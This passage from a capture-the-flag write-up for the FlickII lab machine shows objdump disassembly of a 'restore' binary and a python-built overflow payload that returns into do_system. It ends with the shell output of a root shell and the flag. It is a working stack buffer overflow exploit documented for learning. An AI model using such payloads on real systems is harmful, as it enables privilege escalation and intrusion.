&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Segmentation&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fault&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us used objdump to see what we can do and to which address get back in the
program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;objdump -d ./restore&lt;/span&gt;
&lt;span class="code-line"&gt;[...]&lt;/span&gt;
&lt;span class="code-line"&gt;0000000000400fe1 &amp;lt;get_out_path&amp;gt;:&lt;/span&gt;
&lt;span class="code-line"&gt;  400fe1:   55                      push   %rbp&lt;/span&gt;
&lt;span class="code-line"&gt;  400fe2:   48 89 e5                mov    %rsp,%rbp&lt;/span&gt;
&lt;span class="code-line"&gt;  400fe5:   48 83 ec 40             sub    $0x40,%rsp&lt;/span&gt;
&lt;span class="code-line"&gt;  400fe9:   bf 77 2b 49 00          mov    $0x492b77,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  400fee:   b8 00 00 00 00          mov    $0x0,%eax&lt;/span&gt;
&lt;span class="code-line"&gt;  400ff3:   e8 38 11 00 00          callq  402130 &amp;lt;_IO_printf&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  400ff8:   48 8d 45 c0             lea    -0x40(%rbp),%rax&lt;/span&gt;
&lt;span class="code-line"&gt;  400ffc:   48 89 c7                mov    %rax,%rdi&lt;/span&gt;
&lt;span class="code-line"&gt;  400fff:   e8 2c 15 00 00          callq  402530 &amp;lt;_IO_gets&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401004:   48 8d 45 c0             lea    -0x40(%rbp),%rax&lt;/span&gt;
&lt;span class="code-line"&gt;  401008:   48 89 c6                mov    %rax,%rsi&lt;/span&gt;
&lt;span class="code-line"&gt;  40100b:   bf 94 2b 49 00          mov    $0x492b94,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401010:   b8 00 00 00 00          mov    $0x0,%eax&lt;/span&gt;
&lt;span class="code-line"&gt;  401015:   e8 16 11 00 00          callq  402130 &amp;lt;_IO_printf&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  40101a:   48 8d 45 c0             lea    -0x40(%rbp),%rax&lt;/span&gt;
&lt;span class="code-line"&gt;  40101e:   c9                      leaveq &lt;/span&gt;
&lt;span class="code-line"&gt;  40101f:   c3                      retq&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It looks like the address &lt;code&gt;401f71&lt;/code&gt; would give us a shell if we return there with
the buffer overflow.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;objdump -d ./restore&lt;/span&gt;
&lt;span class="code-line"&gt;[...]&lt;/span&gt;
&lt;span class="code-line"&gt;  401f15:   eb 93                   jmp    401eaa &amp;lt;do_system+0x29a&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f17:   31 d2                   xor    %edx,%edx&lt;/span&gt;
&lt;span class="code-line"&gt;  401f19:   be 00 f5 6b 00          mov    $0x6bf500,%esi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f1e:   bf 02 00 00 00          mov    $0x2,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f23:   48 c7 44 24 30 25 2d    movq   $0x492d25,0x30(%rsp)&lt;/span&gt;
&lt;span class="code-line"&gt;  401f2a:   49 00 &lt;/span&gt;
&lt;span class="code-line"&gt;  401f2c:   48 c7 44 24 38 1d 2d    movq   $0x492d1d,0x38(%rsp)&lt;/span&gt;
&lt;span class="code-line"&gt;  401f33:   49 00 &lt;/span&gt;
&lt;span class="code-line"&gt;  401f35:   48 89 6c 24 40          mov    %rbp,0x40(%rsp)&lt;/span&gt;
&lt;span class="code-line"&gt;  401f3a:   48 c7 44 24 48 00 00    movq   $0x0,0x48(%rsp)&lt;/span&gt;
&lt;span class="code-line"&gt;  401f41:   00 00 &lt;/span&gt;
&lt;span class="code-line"&gt;  401f43:   e8 b8 e2 01 00          callq  420200 &amp;lt;__sigaction&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f48:   31 d2                   xor    %edx,%edx&lt;/span&gt;
&lt;span class="code-line"&gt;  401f4a:   be 60 f4 6b 00          mov    $0x6bf460,%esi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f4f:   bf 03 00 00 00          mov    $0x3,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f54:   e8 a7 e2 01 00          callq  420200 &amp;lt;__sigaction&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f59:   48 8d 74 24 50          lea    0x50(%rsp),%rsi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f5e:   31 d2                   xor    %edx,%edx&lt;/span&gt;
&lt;span class="code-line"&gt;  401f60:   bf 02 00 00 00          mov    $0x2,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f65:   e8 b6 e2 01 00          callq  420220 &amp;lt;__sigprocmask&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f6a:   48 8b 15 ff d7 2b 00    mov    0x2bd7ff(%rip),%rdx        # 6bf770 &amp;lt;__environ&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f71:   48 8d 74 24 30          lea    0x30(%rsp),%rsi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f76:   bf 20 2d 49 00          mov    $0x492d20,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f7b:   c7 05 bb d4 2b 00 00    movl   $0x0,0x2bd4bb(%rip)        # 6bf440 &amp;lt;lock&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f82:   00 00 00 &lt;/span&gt;
&lt;span class="code-line"&gt;  401f85:   c7 05 c1 d4 2b 00 00    movl   $0x0,0x2bd4c1(%rip)        # 6bf450 &amp;lt;sa_refcntr&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f8c:   00 00 00 &lt;/span&gt;
&lt;span class="code-line"&gt;  401f8f:   e8 9c aa 01 00          callq  41ca30 &amp;lt;__execve&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f94:   bf 7f 00 00 00          mov    $0x7f,%edi&lt;/span&gt;
&lt;span class="code-line"&gt;  401f99:   e8 32 aa 01 00          callq  41c9d0 &amp;lt;_exit&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  401f9e:   48 c7 c2 c0 ff ff ff    mov    $0xffffffffffffffc0,%rdx&lt;/span&gt;
&lt;span class="code-line"&gt;  401fa5:   f7 d8                   neg    %eax&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us use python to generate the payload encoded in little endian:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean@fII storage&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*72 + &amp;quot;\x71\x1f\x40&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You may need to use another terminal which would not mess up with your input as
urxvt did. I used tilda for this one. We just need to copy the payload when
choosing the output directory for the restore program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;restore&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Restore&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;tool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;backup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Enter&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Output&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And it got us a root shell from where we can get the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;root@fII storage&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;1001&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bryan&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="mi"&gt;1002&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sean&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@fII&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="err"&gt;]#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;█████▒██▓&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="err"&gt;██▓&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▄████▄&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;██&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▄█▀&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;██▓&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;██▓&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;▓██&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;▒▓██▒&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;▓██▒▒██▀&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▀█&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;██▄█▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▓██▒▓██▒&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;▒████&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░▒██░&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;▒██▒▒▓█&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;▄&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▓███▄░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒██▒▒██▒&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;░▓█▒&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░▒██░&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;░██░▒▓▓▄&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▄██▒▓██&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;█▄&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░██░░██░&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;░▒█░&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;░██████▒░██░▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▓███▀&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░▒██▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;█▄░██░░██░&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒░▓&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░░▓&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▓▒░▓&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░▓&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░░&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;▒&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="err"&gt;░&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;You&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;have&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;successfully&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;completed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;FlickII&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hope&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;learnt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;much&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;as&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;did&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;making&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;Any&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;comments&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;suggestions&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
